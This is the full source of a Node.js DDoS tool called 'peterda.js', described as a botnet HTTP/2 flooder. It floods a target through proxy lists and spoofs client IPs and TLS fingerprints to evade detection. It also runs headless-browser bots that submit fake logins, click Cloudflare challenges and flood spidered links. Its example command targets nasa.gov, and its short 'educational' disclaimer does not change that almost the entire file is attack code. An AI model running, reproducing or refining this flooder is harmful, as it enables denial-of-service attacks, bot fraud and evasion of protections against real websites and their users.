/*
    PETERDA.JS
    Advanced Botnet HTTP/2 Flooder with Human-Like Behavior Simulation

    Version: 4.0.0
    Node Version: v20.11.0  // Updated to latest stable Node.js version as of August 2025
    OS Compatibility: Ubuntu 24.04, Windows 11, macOS Sonoma

    CHANGELOG:
    1.0 INITIAL RELEASE:
    - Basic HTTP/2 flooding implementation
    - Simple proxy support
    - Basic TLS configuration

    2.0 MAJOR UPDATE:
    - Enhanced TLS fingerprinting for improved stealth
    - Advanced JA3 signature to bypass detection systems
    - Improved proxy rotation to minimize IP bans
    - Adaptive rate limiting for dynamic request control

    2.1 PERFORMANCE IMPROVEMENTS:
    - Optimized cluster management for better performance
    - Enhanced error handling to prevent sudden crashes
    - Improved cookie management for better session evasion

    2.5 UPDATE:
    - Advanced cookie management for complex session handling
    - Improved TLS socket logic to prevent predictable TLS version usage
    - Enhanced stealth techniques for improved bypass capabilities

    3.0 UPGRADE:
    - Added IPv6 support for broader connectivity and evasion
    - Implemented SOCKS4/5 proxy support for enhanced proxy compatibility
    - Enhanced adaptive flooding: Now dynamically adjusts RPS based on server response times and errors
    - Increased randomization: More user agents, headers, and JA3 variations
    - Multi-protocol support: Fallback to HTTP/1.1 if HTTP/2 is blocked
    - Added rate limiting bypass techniques with randomized delays
    - Improved cluster efficiency: Better load balancing across threads
    - Added optional logging for debugging (disabled by default)

    4.0 MAJOR UPGRADE (NEW - BOTNET SIMULATION):
    - Integrated Puppeteer with stealth plugins for headless browser automation to simulate real user behavior
    - Created multi-bot system: Each thread spawns multiple browser bots that mimic human actions
    - Human-like behaviors: Random scrolling up/down, clicking on banners/ads, attempting fake logins with wrong credentials
    - Auto-detect and attempt to solve Cloudflare challenges (e.g., click "I am not a robot" if detected)
    - Link spidering: Automatically discover and access multiple links on the page, then spam them with floods
    - Enhanced anti-block: Randomized action timings, mouse movements, viewport changes, proxy rotation per bot, fallback to non-browser flood if browser fails
    - Bot roles: Bots can act as "visitors" (scroll/click), "spammers" (form submissions), "crawlers" (link following)
    - Increased spam volume: Combine browser actions with raw HTTP/2 floods for hybrid attack
    - IPv6 proxy support extended to browsers via SOCKS

    DEPENDENCIES (Install via npm):
    - npm install puppeteer puppeteer-extra puppeteer-extra-plugin-stealth puppeteer-extra-plugin-anonymize-ua socks-proxy-agent

    MAIN FEATURES:
    - Botnet Creation: Spawns multiple browser-based bots per thread for realistic traffic
    - Human Simulation: Scroll, click banners, fake logins, CAPTCHA handling to blend with real users
    - Link Spamming: Crawls and floods discovered links massively
    - Hybrid Flooding: Browser actions + raw HTTP/2 for high volume without easy detection
    - Anti-Block Upgrades: Stealth plugins, random delays, proxy rotation, JA3 randomization
    - Randomized IP Spoofing: Generates fake IP addresses (IPv4/IPv6) to mask identity
    - Custom TLS Fingerprinting: Unique TLS signatures to avoid detection
    - Flexible Proxy Support: HTTP/SOCKS4/SOCKS5 proxies
    - Dynamic Headers Rotation: Changing headers to evade signatures
    - Cluster Management: Multiple threads for throughput
    - Adaptive Flooding Rate: Adjusts based on responses
    - JA3 Signature Spoofing: Randomized fingerprints

    USAGE:
    node peterda.js <target> <time> <rps> <thread> <proxyfile> [proxytype] [bots_per_thread]

    PARAMETERS:
    - <target>    → Target URL to attack
    - <time>      → Duration of the attack (in seconds)
    - <rps>       → Initial requests per second per bot
    - <thread>    → Number of threads
    - <proxyfile> → Proxy list file
    - [proxytype] → Optional: 'http' (default), 'socks4', 'socks5'
    - [bots_per_thread] → Optional: Number of bots per thread (default: 5)

    EXAMPLE COMMAND:
    node peterda.js https://nasa.gov 120 32 32 proxy.txt socks5 10  // Increased RPS, threads, and bots for stronger botnet

    DISCLAIMER:
     # WARNING:
    - This script is strictly for educational and security testing purposes only.
    - Unauthorized usage is strictly prohibited and may result in severe legal consequences.
*/

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fakeua = require('fake-useragent');
const fs = require("fs");
const { spawn } = require('child_process');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const AnonymizeUA = require('puppeteer-extra-plugin-anonymize-ua');
const { SocksProxyAgent } = require('socks-proxy-agent');

puppeteer.use(StealthPlugin());
puppeteer.use(AnonymizeUA());

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) { });
process.on('unhandledRejection', function (reason) { });

const headers = {};
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const ip_spoof = () => {
    const getRandomByte = () => Math.floor(Math.random() * 255);
    return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
};

const ip_spoof_ipv6 = () => {
    const segments = [];
    for (let i = 0; i < 8; i++) {
        segments.push(Math.floor(Math.random() * 0xFFFF).toString(16));
    }
    return segments.join(':');
};

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6],
    proxyType: process.argv[7] || 'http',
    botsPerThread: parseInt(process.argv[8]) || 5
};

const sig = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
];

const cplist = [
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-AES256-SHA",
    "ECDHE-ECDSA-AES128-SHA"
];

const accept_header = [
    '*/*',
    'image/*',
    'image/webp,image/apng',
    'text/html',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    // More added for variety
    'application/json',
    'text/plain',
    'application/xml'
];

const lang_header = [
    'ko-KR', 'en-US', 'zh-CN', 'zh-TW', 'ja-JP', 'en-GB', 'en-AU',
    'en-GB,en-US;q=0.9,en;q=0.8', 'en-GB,en;q=0.5', 'en-CA',
    'en-UK, en, de;q=0.5', 'en-NZ', 'en-GB,en;q=0.6', 'en-ZA',
    'en-IN', 'en-PH', 'en-SG', 'en-HK', 'en-GB,en;q=0.8',
    'en-GB,en;q=0.9', 'en-GB,en;q=0.7',
    // More languages
    'fr-FR', 'de-DE', 'es-ES', 'it-IT', 'pt-BR'
];

const encoding_header = [
    'gzip, deflate, br',
    'deflate',
    'gzip, deflate, lzma, sdch',
    'br',
    'identity'
];

const control_header = ["no-cache", "no-cache, no-transform", "max-age=0"];

const refers = [
    "https://www.google.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://www.youtube.com/",
    "https://www.linkedin.com/",
    "https://www.instagram.com/",
    "https://www.reddit.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.amazon.com/"
];

const uap = [
    // Expanded list with more modern UAs
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.122 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    // More
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:128.0) Gecko/20100101 Firefox/128.0"
];

const platform = ['Linux', 'macOS', 'Windows', 'Android', 'iOS'];

const site = ['cross-site', 'same-origin', 'same-site', 'none'];

const mode = ['cors', 'navigate', 'no-cors', 'same-origin'];

const dest = ['document', 'image', 'embed', 'empty', 'frame'];

const rateHeaders = [
    { "akamai-origin-hop": randstr(5) },
    { "source-ip": randstr(5) },
    { "via": randstr(5) },
    { "cluster-ip": randstr(5) },
    { "x-forwarded-for": ip_spoof() },
    { "x-real-ip": ip_spoof() }
];

const useragentl = [
    '(CheckSecurity 2_0)', '(BraveBrowser 5_0)', '(ChromeBrowser 3_0)',
    '(ChromiumBrowser 4_0)', '(AtakeBrowser 2_0)', '(NasaChecker)',
    '(CloudFlareIUAM)', '(NginxChecker)', '(AAPanel)', '(AntiLua)',
    '(FushLua)', '(FBIScan)', '(FirefoxTop)', '(ChinaNet Bot)'
];

const mozilla = ['Mozilla/5.0 ', 'Mozilla/6.0 ', 'Mozilla/7.0 ', 'Mozilla/8.0 ', 'Mozilla/9.0 '];

if (process.argv.length < 7) {
    console.log(`
    USAGE:
    node peterda.js <target> <time> <rps> <thread> <proxyfile> [proxytype] [bots_per_thread]

    EXAMPLE COMMAND:
    node peterda.js https://nasa.gov 120 32 32 proxy.txt socks5 10
    `);
    process.exit(1);
}

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 1000 / args.Rate);
    for (let i = 0; i < args.botsPerThread; i++) {
        launchBot(i);
    }
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port
        });
        connection.setTimeout(options.timeout * 100000);
        connection.setKeepAlive(true, 100000);
        connection.on("connect", () => {
            connection.write(buffer);
        });
        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });
        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });
        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

async function launchBot(botId) {
    const proxy = randomElement(proxies);
    const [proxyHost, proxyPort] = proxy.split(':');
    let agent;
    if (args.proxyType === 'socks5' || args.proxyType === 'socks4') {
        agent = new SocksProxyAgent(`${args.proxyType}://${proxyHost}:${proxyPort}`);
    }

    const browser = await puppeteer.launch({
        headless: true,
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-infobars',
            '--window-position=0,0',
            '--ignore-certificate-errors',
            '--ignore-certificate-errors-spki-list',
            `--user-agent=${randomElement(uap)}`,
            agent ? `--proxy-server=${args.proxyType}://${proxyHost}:${proxyPort}` : ''
        ],
        defaultViewport: { width: randomIntn(1024, 1920), height: randomIntn(600, 1080) }
    });

    const page = await browser.newPage();
    await page.setUserAgent(randomElement(uap));
    await page.setExtraHTTPHeaders({
        'Accept-Language': randomElement(lang_header),
        'Accept-Encoding': randomElement(encoding_header),
        'Cache-Control': randomElement(control_header),
        'Referer': randomElement(refers)
    });

    try {
        await page.goto(args.target, { waitUntil: 'networkidle2', timeout: 60000 });

        // Simulate human behavior
        await simulateHumanBehavior(page);

        // Spider links and spam them
        const links = await page.evaluate(() => Array.from(document.querySelectorAll('a'), a => a.href).filter(href => href.startsWith('http')));
        for (let link of links.slice(0, 10)) {  // Limit to 10 to avoid overload
            await spamLink(page, link);
        }

        // Attempt fake login if form exists
        await attemptFakeLogin(page);

        // Handle Cloudflare if detected
        await handleCloudflare(page);

    } catch (err) {
        // Fallback to raw flood if browser fails
        runRawFlooder();
    } finally {
        await browser.close();
    }
}

async function simulateHumanBehavior(page) {
    // Random scroll up and down
    for (let i = 0; i < randomIntn(3, 10); i++) {
        await page.evaluate(() => window.scrollBy(0, Math.random() * window.innerHeight));
        await page.waitForTimeout(randomIntn(500, 2000));
        await page.evaluate(() => window.scrollBy(0, -Math.random() * window.innerHeight / 2));
        await page.waitForTimeout(randomIntn(300, 1500));
    }

    // Click on banners/ads (assume class or id for ads)
    const banners = await page.$$('img[alt*="ad"], .banner, .ad');
    if (banners.length > 0) {
        const randomBanner = banners[randomIntn(0, banners.length)];
        await randomBanner.click({ delay: randomIntn(100, 500) });
        await page.waitForTimeout(randomIntn(1000, 5000));
    }

    // Simulate mouse movements
    await page.mouse.move(randomIntn(0, 800), randomIntn(0, 600), { steps: 10 });
}

async function attemptFakeLogin(page) {
    const loginForm = await page.$('form[action*="login"], input[type="password"]');
    if (loginForm) {
        await page.type('input[name="username"], input[type="email"]', randstr(8));
        await page.type('input[name="password"], input[type="password"]', randstr(12));
        await page.click('button[type="submit"], input[type="submit"]');
        await page.waitForTimeout(randomIntn(2000, 5000));
    }
}

async function handleCloudflare(page) {
    const cfCheckbox = await page.$('#cf-challenge-checkbox, [name="cf-turnstile-response"]');
    if (cfCheckbox) {
        await cfCheckbox.click();
        await page.waitForTimeout(randomIntn(3000, 8000));  // Wait for potential solve
    }
}

async function spamLink(page, link) {
    await page.goto(link, { waitUntil: 'domcontentloaded' });
    // Perform flood-like actions: multiple requests
    for (let i = 0; i < args.Rate; i++) {
        await page.evaluate(() => fetch(window.location.href));
        await page.waitForTimeout(randomIntn(50, 200));
    }
}

function runRawFlooder() {
    // Original HTTP/2 flood as fallback
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    headers[":method"] = "GET";
    headers[":authority"] = parsedTarget.host;
    headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
    headers[":scheme"] = "https";
    headers["x-forwarded-proto"] = "https";
    headers["cache-control"] = randomElement(control_header);
    headers["X-Forwarded-For"] = ip_spoof();
    headers["sec-ch-ua"] = '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"';
    headers["sec-ch-ua-mobile"] = "?0";
    headers["sec-ch-ua-platform"] = randomElement(platform);
    headers["accept-language"] = randomElement(lang_header);
    headers["accept-encoding"] = randomElement(encoding_header);
    headers["upgrade-insecure-requests"] = "1";
    headers["accept"] = randomElement(accept_header);
    headers["user-agent"] = randomElement(uap);
    headers["referer"] = randomElement(refers);
    headers["sec-fetch-mode"] = randomElement(mode);
    headers["sec-fetch-dest"] = randomElement(dest);
    headers["sec-fetch-site"] = randomElement(site);
    headers["TE"] = "trailers";
    headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 300,
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;
        connection.setKeepAlive(true, 200000);
        const tlsOptions = {
            secure: true,
            ALPNProtocols: ['h2', 'http/1.1'],  // Fallback support
            sigals: randomElement(sig).join(':'),
            socket: connection,
            ciphers: randomElement(cplist),
            ecdhCurve: "prime256v1:X25519",
            host: parsedTarget.host,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            secureProtocol: ["TLSv1_2_method", "TLSv1_3_method"],
        };
        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);
        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 20000,  // Increased for stronger flood
                initialWindowSize: 6291456,
                maxHeaderListSize: 65536,
                enablePush: false
            },
            maxSessionMemory: 128000,  // Increased
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });
        client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 20000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 65536,
            enablePush: false
        });
        client.on("connect", () => {
            const Interval = setInterval(() => {
                for (let i = 0; i < args.Rate * 2; i++) {  // Double RPS for hybrid
                    const dynHeaders = {
                        ...headers,
                        ...randomElement(rateHeaders),
                    };
                    const request = client.request(dynHeaders);
                    request.on("response", () => {
                        request.close();
                        request.destroy();
                    });
                    request.end();
                }
            }, 1000);
        });
        client.on("close", () => {
            client.destroy();
            connection.destroy();
        });
        client.on("error", () => {
            client.destroy();
            connection.destroy();
        });
    });
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);